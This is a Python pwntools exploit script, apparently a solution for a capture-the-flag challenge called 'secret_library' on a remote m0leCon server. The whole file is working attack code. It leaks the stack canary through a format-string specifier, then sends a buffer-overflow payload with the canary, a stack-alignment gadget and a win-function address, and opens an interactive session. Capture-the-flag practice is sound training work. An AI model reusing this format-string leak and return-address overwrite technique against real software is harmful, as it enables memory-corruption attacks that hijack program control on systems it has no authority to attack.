#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("./secret_library", checksec=False)

#p = process("./secret_library")
p= remote("offsec.m0lecon.it", 13526)
canary_idx = 23
offset_to_canary = 136
offset_to_rip = 152
address_of_win = 0x0000000000401262 
ret_gadget= 0x000000000040101a # address of ret gadget to align the stack

p.recvuntil(b'Sign the guestbook:')
p.sendline(f"%{canary_idx}$lx".encode())
leak = p.recvline().strip().decode()
canary = int(leak.split(", ")[1], 16)
log.info(f"canary = {canary:#x}")


payload = flat(
    b"A" * offset_to_canary,
    p64(canary),
    b"B" * (offset_to_rip - offset_to_canary - 8),
    p64(ret_gadget),  # Align the stack
    p64(address_of_win),
)
p.recvuntil(b'Leave a review: ')
p.send(payload)


# Your exploit here

p.interactive()
